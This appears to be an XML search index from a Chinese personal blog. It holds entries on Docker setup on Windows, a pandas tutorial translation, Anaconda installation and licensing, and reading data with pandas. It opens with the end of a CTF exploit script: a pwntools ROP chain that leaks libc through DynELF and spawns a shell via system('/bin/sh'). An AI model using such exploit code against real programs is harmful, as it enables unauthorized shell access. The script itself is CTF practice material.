DynELF(leak,elf=ELF('./xmanlevel4'))sysaddr = dynelf.lookup('system','libc')print "system address is " + hex(sysaddr)print "-----------------------------------"payload1 = 'a' * 140payload1 += p32(readplt)payload1 += p32(pppraddr)payload1 += p32(0)payload1 += p32(bssaddr)payload1 += p32(8)payload1 += p32(sysaddr)payload1 += p32(1)payload1 += p32(bssaddr)p.send(payload1)p.send('/bin/sh\0')p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win下Docker默认存储位置修改]]></title>
      <url>%2F2017%2F02%2F14%2Fwin%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9%2F</url>
      <content type="text"><![CDATA[在如前安装完docker后，会有如下界面：之后我们会通过一系列的命令来建造容器，而所需要的镜像则会被默认存放在C盘中的 虚拟机磁盘文件disk.vmdk中，所以为防止以后镜像过多而导致的C盘空间不足，要想办法修改一下存储的位置。 第一步先停掉 docker-machine,命令行中输入 docker-machine stop default 第二步在virturalbox界面同时按下 ctrl+D 调出虚拟介质管理器。 红箭头所指即为docker-machine的虚拟磁盘文件地址。点击右上角的复制，根据提示操作，为保持一致性，在选择磁盘时选择 vmdk磁盘，并选择你要作为磁盘存放路径的目录。这里我将其复制到了 D:\virtualboxVM\docker-machine\disk.vmdk 第三步返回virtualbox界面，按下 ctrl+s 跳出关于虚拟机 default 的设置界面。先移除掉原本的 disk.vmdk 再点选控制器，选择出现的两个按钮中的右边那个：添加虚拟硬盘选择“使用现有的虚拟盘”，将第二步中复制出来的硬盘文件导入。添加完成后，如下，可以发现disk的路径已经改变。 第四步重启docker，命令行中输入： docker-machine start default 即可]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[windows平台下Docker环境搭建]]></title>
      <url>%2F2017%2F02%2F13%2Fwindows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
      <content type="text"><![CDATA[由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。 下载win下我们一般直接选择 Docker Toolbox 法一docker的官网：下载地址但官网下载会很慢，甚至下载了好久突然间失败hh 法二镜像站：下载地址速度快，但版本的更新问题啥的自己注意。 安装下载的exe打开，一路跟着提示走。 可以自己选择安装位置,但要记住。后面要用到。这里为 D:\Docker Toolbox 注意需要安装virtualbox，因为我们是在win平台下安装docker，而docker是高度依赖linux的，所以这里需要virtualbox（开源免费）来提供win平台下linux内核的接口与特性 需要安装git for windows，若原本机子中已经有了，可以勾掉不选择。 kitematic是docker的GUI工具，也顺便安了吧。不过一般咱都是用命令行的嘛。 耐心等待安装过程结束 初次启动安装完成后，桌面上会多出三个图标 Oracle VM VirtualBox Kitematic (Alpha) Docker Quickstart Terminal 这里我们只需要先打开（双击）第三个。第一次运行时，黑屏幕上只有光标，可能需要先打一个回车。一般情况下如下： 可能等很久都没有反应，我说的是 “可能”hh注意到里面的意思是要把 boot2docker 下载下来，记住下载路径： C:\Users\ASUS\.docker\machine\cache 打开dokcer的安装路径（以我的安装路径为例）D:\Docker Toolbox将里面的 boot2docker.iso 拷贝到 下载路径里 回到桌面运行 Docker Quickstart Terminal，可能需要再按一次回车 等“安装”完成，控制台会出现： 完成后最好重启一下这样就行啦。 可能的问题初始化问题解决方法：将 virtualbox 和 docker 卸载掉，重启，再重新安装 Terminal一直自动关闭解决方法：重启电脑……]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（5）ten Minutes to pandas中文版下]]></title>
      <url>%2F2017%2F02%2F02%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B%2F</url>
      <content type="text"><![CDATA[此文是 ten-Minutes-to-pandas 下半部分的翻译。上半部分请看：《数据挖掘比赛（4）ten Minutes to pandas中文版上》紧接上文的数据，如下：以下下半部分正文开始： 操作（Operations）更多内容请看：《Basic section on Binary Ops》 统计（Stats）通常情况下，这些操作的对象不包括缺失值 描述性统计信息1df.mean() 指定轴向在其他轴上执行相同操作1df.mean(1) 自动对应维度对具有不同维度和需要对齐的对象操作时，pandas会自动地沿着特定的维度进行广播（注：其实就是运算啦）123# 准备工作s = pd.Series([1,3,5,np.nan,6,8], index=dates).shift(2)s （注：.shift操作会对数据进行移动，空出的位置用nan代替） 1df.sub(s, axis='index') （注： .sub 表示 减去 ） 函数应用（Apply）把函数应用到数据上 使用已有函数1df.apply(np.cumsum) （注：np.cumsum的使用方法） 使用匿名函数1df.apply(lambda x: x.max() - x.min()) （注：lambda表达式，建议百度） 直方图（Histogramming）更多内容请查阅 《Histogramming and Discretization》123# 准备工作s = pd.Series(np.random.randint(0, 7, size=10))s 1s.value_counts() （注：Histogramming翻译过来是叫直方图。这里value_counts返回的数据中说明了 5 出现了 3 次， 2 出现了 2 次等等，虽无图形，但实际上却是是直方图的表示） 字符串方法（String Methods）Series对象的 str属性 中集成了一系列用于处理字符串的方法，如下代码所示，能够很方便对对象中的每个元素进行处理。注意到，通常情况下在 str属性中的 模式匹配（pattern-matching）默认使用了 正则表达式（regular expressions）。更多内容请查阅 《Vectorized String Methods》 123# 准备工作s = pd.Series(['A', 'B', 'C', 'Aaba', 'Baca', np.nan, 'CABA', 'dog', 'cat'])s 12# .loewr() 转换成小写字母s.str.lower() 数据合并（Merge）就合并类操作（join / merge-type operations）而言，pandas提供了各种工具能方便地对Series，DataFrame，和 Panel对象 进行各种逻辑演算来进行数据合并 。更多内容请查阅《Merging section》（注：上面这段话在原文中放在concat的开头，为逻辑和结构上的完整和流畅，我这里放到了这边） Concat用 concat() 把pandas对象联系（Concatenating）起来123# 准备工作df = pd.DataFrame(np.random.randn(10, 4))df 123# 准备工作2：把刚刚生成的df分片（break it into pieces）pieces = [df[:3], df[3:7], df[7:]]pieces 12# 使用concat()连接pd.concat(pieces) JoinSQL形式的连接。更多内容请查阅《Database style joining》 示例一123# 准备工作1left = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'lval': [1, 2]&#125;)left 123# 准备工作2right = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'rval': [4, 5]&#125;)right 12# 使用 merge() 连接pd.merge(left, right, on='key') 示例二另一个例子如下：123# 准备工作1left = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'lval': [1, 2]&#125;)left 123# 准备工作2right = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'rval': [4, 5]&#125;)right 1pd.merge(left, right, on='key') Append向 dataframe对象添加行。更多内容请查阅 《Appending》 123# 准备工作1df = pd.DataFrame(np.random.randn(8, 4), columns=['A','B','C','D'])df 123# 准备工作2s = df.iloc[3]s 12# 使用 appenddf.append(s, ignore_index=True) 分组（Grouping）对分组操作，我们指的是包含以一个或多个步骤的过程： 根据某些标准把数据切分（Splitting）成不同组别 给每个组别独立地应用（Applying）函数 将结果组合（Combining）成同一数据结构 更多内容请查看 《Grouping section》 12345678# 准备工作df = pd.DataFrame(&#123;'A' : ['foo', 'bar', 'foo', 'bar', ....: 'foo', 'bar', 'foo', 'foo'], ....: 'B' : ['one', 'one', 'two', 'three', ....: 'two', 'two', 'one', 'three'], ....: 'C' : np.random.randn(8), ....: 'D' : np.random.randn(8)&#125;)df 一列分组，然后对各个分组结果应用函数（sum）1df.groupby('A').sum() 多列根据多列分组，形成层次索引，从而可以对其使用函数。1df.groupby(['A','B']).sum() 数据重组（Reshaping）更多内容请查看 《Hierarchical Indexing》 和 《Reshaping》 Stack123456789# 准备工作tuples = list(zip(*[['bar', 'bar', 'baz', 'baz', ....: 'foo', 'foo', 'qux', 'qux'], ....: ['one', 'two', 'one', 'two', ....: 'one', 'two', 'one', 'two']]))index = pd.MultiIndex.from_tuples(tuples, names=['first', 'second'])df = pd.DataFrame(np.random.randn(8, 2), index=index, columns=['A', 'B'])df2 = df[:4]df2 12stacked = df2.stack()stacked 对于一个 “stacked” 的 DataFrame 或者 Series 对象 （它们的索引是层次索引），stack（）操作的逆操作是 unstack（），它默认情况下只处理末级层次的索引。 1stacked.unstack() 1stacked.unstack(1) 1stacked.unstack(0) 数据透视表（Pivot Tables）更多内容请查阅 Pivot Tables 1234567# 准备工作df = pd.DataFrame(&#123;'A' : ['one', 'one', 'two', 'three'] * 3, .....: 'B' : ['A', 'B', 'C'] * 4, .....: 'C' : ['foo', 'foo', 'foo', 'bar', 'bar', 'bar'] * 2, .....: 'D' : np.random.randn(12), .....: 'E' : np.random.randn(12)&#125;)df 我们可以很简便地从数据中得到数据透视表1pd.pivot_table(df, values='D', index=['A', 'B'], columns=['C']) 时间序列（Time Series）在频率转换重采样时，pandas具有简单强大有效的作用（比如说，把秒级采样的数据转换成 5分钟级别的数据）。这在金融领域非常常见，当然也不仅局限于此。更多内容请查阅 《Time Series section》 时分秒1234# 准备工作rng = pd.date_range('1/1/2012', periods=100, freq='S')ts = pd.Series(np.random.randint(0, 500, len(rng)), index=rng)ts （注：上图只截取了一部分的数据） 12# 转换ts.resample('5Min').sum() 时区时区表示1234# 准备工作rng = pd.date_range('3/6/2012 00:00', periods=5, freq='D')ts = pd.Series(np.random.randn(len(rng)), rng)ts 12ts_utc = ts.tz_localize('UTC')ts_utc 时区转换1ts_utc.tz_convert('US/Eastern') 时期转换（period）123rng = pd.date_range('1/1/2012', periods=5, freq='M')ts = pd.Series(np.random.randn(len(rng)), index=rng)ts 12ps = ts.to_period()ps 时间戳转换（timestamp）1ps.to_timestamp() 函数应用在 时期（period）和时间戳（timestamp）转换时有一些方便的算术函数可以使用。在下面的例子中，我们把以季度为频率的数据转换成以季度末月为频率的数据。123prng = pd.period_range('1990Q1', '2000Q4', freq='Q-NOV')ts = pd.Series(np.random.randn(len(prng)), prng)ts 12ts.index = (prng.asfreq('M', 'e') + 1).asfreq('H', 's') + 9ts.head() 分类型数据（categorical）从 0.15版本开始，pandas的dataframe对象开始支持分类性数据（categorical data）。更多内容请查阅 《categorical introduction》 和 《API documentation》12df = pd.DataFrame(&#123;"id":[1,2,3,4,5,6], "raw_grade":['a', 'b', 'b', 'a', 'a', 'e']&#125;)df 转换将原始grade数据转换成分类型数据12df["grade"] = df["raw_grade"].astype("category")df["grade"] 重命名给分类型数据重命名为更有意义的名字。（通过 Series.cat.categories 来指派位置）12df["grade"].cat.categories = ["very good", "good", "very bad"]df 数据修整给分类型数据重排序，同时填补缺失值。（默认情况下， Series.cat 方法会返回一个新的Series类型 ）12df["grade"] = df["grade"].cat.set_categories(["very bad", "bad", "medium", "good", "very good"])df["grade"] 排序问题给分类型排序是按照 categories 的顺序，而不是按照字典顺序1df.sort_values(by="grade") 归类按照分类列来数据归类时，空的类别也会显示出来。1df.groupby("grade").size() 作图（Plotting）更多内容请看《Plotting》 基本画图1234# 数据ts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2000', periods=1000))ts = ts.cumsum()ts 12# 作图ts.plot() dataframe作图在dataframe对象里，plot（）可以很方便地画出所有有标签的列。1234df = pd.DataFrame(np.random.randn(1000, 4), index=ts.index, .....: columns=['A', 'B', 'C', 'D'])df = df.cumsum()plt.figure(); df.plot(); plt.legend(loc='best') 数据读写（Getting Data In/Out）CSV写入把数据写进 CSV文件。更多内容请查阅 《Writing to a csv file》1df.to_csv('foo.csv') 读出将数据从 csv文件 中读出。更多内容请查阅 《Reading from a csv file》1pd.read_csv('foo.csv') HDF5更多内容请看 《HDFStores》 写入1df.to_hdf('foo.h5','df') 读出1pd.read_hdf('foo.h5','df') Excel更多内容请看 《MS Excel》 写入1df.to_excel('foo.xlsx', sheet_name='Sheet1') 读出1pd.read_excel('foo.xlsx', 'Sheet1', index_col=None, na_values=['NA']) 陷阱（Gotchas）如果你试着做这样的操作，你会得到如下信息。 更多信心请查看 《Comparisons》 和 《Gotchas》]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（4）ten Minutes to pandas中文版上]]></title>
      <url>%2F2017%2F02%2F01%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A%2F</url>
      <content type="text"><![CDATA[pandas官方文档中有一份快速入门教程《ten Minutes to pandas》，虽然网上早有其中文翻译，不过可能是旧版的：）所以闲来无事，自己也翻译最新版本的学习一下。 这里示例部分都由代码和运行结果图片组成，读者可以直接复制代码来运行；同时为了更清晰，加入了一些小结构标题，所以在小细节处跟官方文档略有不同。本机的运行环境是Python 3.5.2 |Anaconda 4.2.0 (64-bit) ，pandas库的版本为0.19.2，使用jupyter noterbook作为交互环境，对照的这份文档版本为 0.19.2 。这篇文章是对 ten-Minutes-to-pandas的上半部分的翻译。以下正文开始： 总说这是一份主要面向新手的对pandas库的简要介绍。想了解更多，你可以通过阅读Cookbook通常，我们像下面这样导入：123import pandas as pdimport numpy as npimport matplotlib.pylot as plt 创建对象（Object Creadtion）可以通过查看Data Structure Intro section来获取关于这节的更多内容 创建Series我们可以通过传递列表（list）来创建 Series，pandas会自动为其生成默认整数索引。12s = pd.Series([1,3,5,np.nan,6,8])s 创建DataFrame传递数组我们可通过传递数组对象（numpy array），时间索引（datetime index）、列标签（labeled columns）来创建 DataFrame12dates = pd.date_range('20130101',periods=6)dates 12df = pd.DataFrame(np.random.randn(6,4),index=dates,columns=list('ABCD'))df 传递字典我们可以通过传递一个能被转换成类似序列（Serise-like）的字典对象（dict）来创建 DataFrame 1234567df2 = pd.DataFrame(&#123; 'A' : 1.,....: 'B' : pd.Timestamp('20130102'),....: 'C' : pd.Series(1,index=list(range(4)),dtype='float32'),....: 'D' : np.array([3] * 4,dtype='int32'),....: 'E' : pd.Categorical(["test","train","test","train"]),....: 'F' : 'foo' &#125;)df2 它们的列有不同的数据类型1df2.dtypes IPython如果你使用 IPython ，那么tab键能自动补全 列名（column names）和 属性（ public attributes）。下面是能被自动补全的属性的一个子集：1df2. （注：如上图红箭头处按 tab键 ） 你可以看到，列名 A 等会被自动补齐……（原文：As you can see, the columns A, B, C, and D are automatically tab completed. E is there as well; the rest of the attributes have been truncated for brevity。 因为没有做和原文相似的图，所以这句只好：）不翻译了hh ） 查看数据（Viewing Data）查看 Basics section 获得关于这节的更多内容。 查看frame中的头部和尾部部分的行1df.head() 1df.tail() 显示索引、列名、底层numpy数据（the underlying numpy data）1df.index 1df.columns 1df.values （注：这个values，应该就是把df中的数据直接以numpy array的形式打印出来，注意与前面的 df 命令图片对比一下） 对数据进行快速简单统计1df.describe() (注：count：计数，多少个hh；mean：平均数；std：方差；min：最小值；25%：分位数； 50%：分位数，中位数；75%：分位数；max：最大值) 转置（Transposing）1df.T 排序按轴排序（Sorting by an axis）1df.sort_index(axis=1, ascending=True) （注：axis=1表明按照column来排序，关于axis的讨论参见 Stackoverflow:What does axis in pandas mean?；ascending=False说明要用降序排序，其默认值True代表升序） 按值排序（Sorting by values）1df.sort_values(by='B') （注：这里没有传入或没有显式指定ascending参数，则其默认值为True，为升序排列。） 选择（Selection）尽管python/numpy的关于选择（selecting ）和设定（setting）的表达式能直接（intuitive）在交互式环境（interactive work）中派上用场，但在实际工作中，我们推荐使用经过优化（optimized）的pandas方法：.at, .iat, .loc, .iloc 和 .ix. 想了解更多请查阅：《Indexing and Selecting Data》和《MultiIndex/Advanced Indexing》 获取数据（Getting）获取列选择单独的一列，返回一个 Series 对象，相当于 df.A1df['A'] （注：这里附上 df.A 的结果：） 获取行通过 [ ] 对行进行选取，这操作会对行进行切片（slice） 1df[0:3] 1df['20130102':'20130104'] 通过标签选择（Selection by Label）—— .loc（注：由于写这篇时间过长，jupyter notebook中前面的代码要重新运行一遍，而前面的示例中使用了random函数产生的随机值，所以重新运行后下面的数据会跟上面的数据不太一样，这里放上重新运行后 df值 的图，以作为对照。） 想了解关于本节更多内容请查看 Selection by Label 通过标签获得交叉区域（cross section）1df.loc[dates[0]] 通过标签进行多轴选择（multi-axis）1df.loc[:,['A','B']] 标签切片，两端确定1df.loc['20130102':'20130104',['A','B']] 缩减返回对象的维度1df.loc['20130102',['A','B']] 获取标量值1df.loc[dates[0],'A'] 快速获取标量值结果与前面一个方法相同1df.at[dates[0],'A'] （注：.loc和 .at运行时间对比如下：） 通过位置选择（Selection by Position）—— .iloc想了解本节更多内容请查看 Selection by Position 通过传入整数来选择1df.iloc[3] 数值切片，跟numpy/python类似1df.iloc[3:5,0:2] 传入指定位置（整数）的列表，与numpy/python类似1df.iloc[[1,2,4],[0,2]] 对行切片（slicing rows）1df.iloc[1:3,:] 对列切片（slicing columns）1df.iloc[:,1:3] 取值（标量值）1df.iloc[1,1] 更快取值（标量值）1df.iat[1,1] （注：以下是 .iloc 和 .iat 的时间比较。） 通过布尔表达式进行索引（Boolean Indexing）使用单独一列来选择数据1df[df.A &gt; 0] 使用 where 操作来选择数据1df[df &gt; 0] （注：虽然没有出现where，但这个确实是where操作） 使用 isin() 方法来过滤数据1234# 准备工作df2 = df.copy()df2['E'] = ['one', 'one','two','three','four','three']df2 12# 使用isin()df2[df2['E'].isin(['two','four'])] 设置（Setting）设置新的列，使其数据自动按索引排列123# 准备工作s1 = pd.Series([1,2,3,4,5,6], index=pd.date_range('20130102', periods=6))s1 123# 设置新的列df['F'] = s1df 通过标签（label）来设置数值1df.at[dates[0],'A'] = 0 通过位置（position）来设置数值1df.iat[0,1] = 0 通过指定numpy数组来设置数值1df.loc[:,'D'] = np.array([5] * len(df)) 经过前面一堆操作后的结果： 通过 where 操作来设置数值123df2 = df.copy()df2[df2 &gt; 0] = -df2df2 处理缺失值（Missing Data）pandas主要用值 np.nan 来表示缺失值。默认情况下，它不会参与计算。更多内容查看 Missing Data section 重索引（Reindexing）重索引能让你对特定的轴（axis）来进行索引的改变/添加/删除。它会返回一个复制值（注：也就是说不会改变原本的数据）。123df1 = df.reindex(index=dates[0:4], columns=list(df.columns) + ['E'])df1.loc[dates[0]:dates[1],'E'] = 1df1 删除所有具有缺失值的行（dropna）1df1.dropna(how='any') 填充缺失值（fillna）1df1.fillna(value=5) 缺失值的布尔表达式（isnull）1pd.isnull(df1) 剩余内容请看：数据挖掘比赛（5）ten Minutes to pandas中文版下]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（3）申请anaconda-academic-license并使用]]></title>
      <url>%2F2017%2F01%2F29%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[Anaconda是python的一个科学计算发行版，里面集成了各种各样的科学计算包，如numpy、pandas、sklearn等。作为学生，在使用anaconda发行版的同时，我们可以申请anaconda的学术证书，通过它可以下载一些额外的包以实现计算过程的加速。 注册、申请、下载注册地址：https://anaconda.org/ 其中的email要用学校邮箱，否则不能申请成功。我的邮箱是 **@stu.xmu.edu.cn 在注册完了后，先点右上角的头像处，再选择My Setting 如下： 选择add ons 将右边的三个license下载下来：MKL Optimizations、IOPro、Anaconda Accelerate。 安装先打开命令行，输入如下命令（注，我这里以windows下为例），确定license的安装位置。 conda info --license 如图 （注：ASUS即用户的主文件夹，各位根据自己的电脑调整） 然后将下载的3个license（即txt文件）放到 .continuum 文件夹里面。这里注意下，如果打开个人文件夹(这里即ASUS文件夹)没看到 .continuum ，那要记得勾选一下显示隐藏文件。如果还不存在，那需要自己创建 .continuum 文件夹。如下： 然后打开命令行，分别输入 conda install accelerate conda install iopro 注意，是分别输入，而且在安装accelerate时为满足dependency会同时安装mkl，所以就不单独输入conda install mkl了。比如安装 accelerate 模块，如下： 跟着提示来，下载过程可能有点慢：） 测试使用以accelerate为例，从add ons页面中可以看出acelerate的作用是： Fast Python for GPUs and multi-core with NumbaPro and MKL Optimizations. 在安装accelerate后我们可以利用GPU显卡来加速计算过程。不过查了官方文档搜了stackoverflow翻遍了google和百度都没有找到单独关于acclerate库的使用，大多数的讨论集中于在安装后对numba的使用，所以这里用numba来测试一下加快了多少。在测试前我把显卡的驱动升级了下，接下来确定一下机子的显卡是否支持。命令行打开，输入：123import numba.cuda.api,numba.cuda.cudadrv.libsnumba.cuda.cudadrv.libs.test()numba.cuda.api.detect() 第一行导入库，第二行用来检测库的安装正确，第三行用来确定显卡是否支持加速。 下面是测试代码（网上找的稍微修改了下，自己还写不出来）：1234567891011121314151617181920212223242526272829303132333435import numpy as npfrom numba import jitnobs = 1000000def proc_numpy(x,y,z): x = x*2 - ( y * 55 ) # these 4 lines represent use cases y = x + y*2 # where the processing time is mostly z = x + y + 99 # a function of, say, 50 to 200 lines z = z * ( z - .88 ) # of fairly simple numerical operations return z@jitdef proc_numba(xx,yy,zz): for j in range(nobs): # as pointed out by Llopis, this for loop x, y = xx[j], yy[j] # is not needed here. it is here by # accident because in the original benchmarks x = x*2 - ( y * 55 ) # I was doing data creation inside the function y = x + y*2 # instead of passing it in as an array z = x + y + 99 # in any case, this redundant code seems to z = z * ( z - .88 ) # have something to do with the code running # faster. without the redundant code, the zz[j] = z # numba and numpy functions are exactly the same. return zzx = np.random.randn(nobs)y = np.random.randn(nobs)z = np.zeros(nobs)res_numpy = proc_numpy(x,y,z)z = np.zeros(nobs)res_numba = proc_numba(x,y,z)%timeit proc_numpy(x,y,z)%timeit proc_numba(x,y,z) 结果如图,第一行是用cpu计算的时间，2.06ms；第二行是gpu计算的时间 121μs；就本例而言快了17倍左右。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（2）利用pandas读取大型数据集]]></title>
      <url>%2F2017%2F01%2F25%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86%2F</url>
      <content type="text"><![CDATA[数据比赛中，有时提供的数据集会很大，常规方法打不开，这时候就需要在读入时做些小处理，方便后续操作。 读入以IJCAI-17比赛数据集中的user_pay.txt 和 user_view.txt 为例，user_pay.txt有 2.13Gb 之大，而user_view.txt 只有 174Mb 。两者的读入方法见下。 对于 user_view.txt 这种较小型的数据 ，直接读入即可。如下：123import pandas as pduser_view_db = pd.read_table('user_view.txt',header=None,sep=',')user_view_db.head() 但对于如 2.13Gb大的 user_pay.txt 的大型数据，如果直接读入，会让硬盘和内存飙满且速度非常慢（机子好的童鞋请忽略—）。对此，采取的策略是分块读入。在用 read_table 读入时指定 chunksize 参数和 iterator参数，如下：1user_pay_db = pd.read_table('user_pay.txt',header=None,sep=',',iterator=True,chunksize=10000) (注：chunksize等于多少可以自己选定，iterator=True好像一般都这么设定：）至于why在stackoverflow上有相关问题但似乎没有满意的答案) 可以看到多了两个参数后，user_pay_db 不再是dataframe了，而是pandas.io.parsers.TextFileReader。想要查看它可以如下：12for chunk in user_pay_db: print(chunk) 它会按照 chunksize 的大小打印出内容，如下: （由于数据集过大，只截取部分内容） 处理接下来的处理有两种，一是可以直接对 user_pay_db 中的每个 chunk 进行分块处理，也可以想办法把 此时为TextFileReader的 user_pay_db 转化为易于操作的 dataframe格式。这里只演示第二种方法。 我们可以借助 pandas 中的concat方法来合并数据集。如下：1df = pd.concat([chunk for chunk in user_pay_db],ignore_index=True) 这里用变量df来存储。我们给concat传了两个参数，第一个是利用了for循环，注意不要忽略了中括号；第二个参数用于告诉concat连接时忽略掉每个chunk中原有的index，否则等连接完后，会出现同一个index对应了多个项的情况，如下： 小结（题外话）上面的代码是基于 Anaconda 4.2.0 (64-bit)集成包的。其pandas版本为0.18.1，而最新的pandas版本为0.19，其中的一些函数的使用方法做了更新，比如concat。希望读者在上述代码运行不了不对的情况下能查查文档留留言一起讨论：） 下面附上pandas的文档地址 pandas 0.18.1 文档 pandas 0.19.2 文档 不清楚自己pandas版本的，见下,其中version前后都是两个下划线__： 欢迎留言：）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（1）对无列名的txt数据集读取方法及处理]]></title>
      <url>%2F2017%2F01%2F24%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86%2F</url>
      <content type="text"><![CDATA[接触大数据比赛，必然要接触大数据（&lt;—好吧废话）所以第一道门槛是如何读取大数据文件。有时比赛提供的dataset是带有标签的csv格式文件，有时也会提供不带标签的普通txt文件，此文主要写写对读取此种txt文件的一些小方法和处理。 基本的读入其实python里已经集成了csv模块了，不过使用起来不那么方便。一般而言，使用pandas库可以把数据读入成dataframe形式方便操作。 读入csv文件以kaggle的titanic数据集为例用pandas读入的代码如下:12import pandas as pdtitanic_db = pd.read_csv('titanic_train.csv') 这样就能把数据集读进来了，如下：几道’\’是可能因为屏幕小（，，ԾㅂԾ，，）而产生的换行提示。显示出来的有5行（0~5），每行的上面都有对应的列名。 读入txt文件以IJCAI-17比赛数据集中的user_view.txt为例notepad++打开如下：用pandas读入的代码如下:12import pandas as pduser_view = pd.read_table('user_view.txt') 注意代码应该是 read_table .结果如下可以看到读入后，pandas把txt文件的第一行当做了列名，很明显这是错误的:) 这个我们下面来进行修正。 针对无列名文件第一行的读入处理上面提到的 read_csv 、read_table 等，其实他们的参数不仅仅只有一个。为了让无列名的数据读入正确，我们可以在读入的时候多指定一个参数header=None。以user_view.txt为例。1user_view = pd.read_table('user_view.txt'，header=None) 读入结果如下： 可以看到读入后，原txt文件中的第一行有了Index（即 0），不再被识别为列名。 对txt数据集读入处理为正常的dataframe形式在指定header=None读入txt文件后，pandas自动给添了个列名 0，这表明读入的每一行其实都是读入了一字符串，总共只有 1 列！对数据的操作很不方便 所以我们在遇到这种情况时，我们还要继续指定参数sep，告诉pandas以什么为分隔符。以user_view.txt为例，从上图可知每行的数据有三个部分，用逗号(，)相隔开。所以在读入时，如下：1user_view = pd.read_table('user_view.txt'，header=None，sep='，') 可以发现每列（3列）的列名被设置为 0 1 2，这样我们可以很方便地对数据进行操作。 给无列名的数据集添加列名法一：直接操作好吧，这个方法当然是最简单的，csv用excel打开，txt用notepad++、sublime打开，然后自己填上列名，再正常读入就行了嘛! 只是通常情况下，所遇到的数据集比较大，用excel或者notepad等难以打开，又或者打开后不好操作，局限性比较大。同时在直接操作添加时还要考虑原数据集的格式和编码，方便后面进一步读入。 法二：在利用pandas读入时指定列名以user_view.txt数据集为例，阿里天池上的数据说明是 Field Sample Description user_id 0000000001 用户id shop_id 000001 商家id，与shop_info对应 time_stamp 2015-10-10 10:00:00 浏览时间 所以在读入时，我们可以再指定一个参数 names .对照上述说明和基于前面的操作()，代码如下：123import pandas as pdcolumns = ['user_id','shop_id','time_stamp']user_view_db = user_view_db = pd.read_table('user_view.txt',header=None,sep=',',names=columns) 结果如下： 法三：在用pandas读入后再制定列名在完成如前面基本的读入和处理后，此时 user_view_db 应该是 列名为[0,1,2] 的datframe了。此时我们再通过指定其属性columns来指定列名。1user_view_db.columns=['user_id','shop_id','time_stamp'] 如下：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（0）环境搭建之anaconda安装]]></title>
      <url>%2F2017%2F01%2F22%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85%2F</url>
      <content type="text"><![CDATA[最近开始接触一些kaggle的比赛，需要搭建基本的环境。原本在本机和服务器上“搭好了”，numpy.test()等都没有问题，同样的代码却运行出了不同的结果… 后面接触到了 anaconda这个集成的python科学计算环境，一键式解决大部分问题，甚至在win下也能安装：)这样也省去了开一大堆虚拟机的麻烦。 简介网上各种简介一大堆，对我而言……scipy在win下死活没装上，不过在 anaconda 里已经很好的集成了，嗯不多说了。 下载按理我们都是去官网（https://www.continuum.io/downloads）下载，不过下载速度十分可观，不知道翻墙后能不能好点。我的方法是在浏览器下载时复制其下载链接，然后放到百度云里面离线下载，可能会出现链接失效的情况，但其实只要一直点离线下载：) 一般最后会成功的。下面这两个是我刚离线完的，目前还是最新版，各位如果需要可以保存一下。 Anaconda3-4.2.0-Windows-x86： 链接：http://pan.baidu.com/s/1hsxB3MG 密码：5k0x Anaconda3-4.2.0-Linux-x86_64.sh 链接：http://pan.baidu.com/s/1dETp0LN 密码：xm7x 这两个版本是python3，64bit的. 大家自己看着办：) 安装win平台下的安装很简单，傻瓜式操作，中间会有两个选项用来把anaconda加入系统环境变量，安装后系统环境如下： ubuntu下的安装，在虚拟机安装时挺顺利的，但在云服务器上除了一点小问题，可能跟服务器的初始环境有关吧:) 运行一下sh脚本，跟着提示来，最后一步是问是否要把anaconda加入系统环境变量，选yes一般来讲应该是能成功的。如果在最后一步时没有成功或者说输入了yes以外的值而导致无法默认运行anaconda的话，也可以按照如下做法（以云服务器上为例，这里我顺便把最基本操作写出来吧，$表示在terminal里的意思……）： $ vim /home/ubuntu/.bashrc 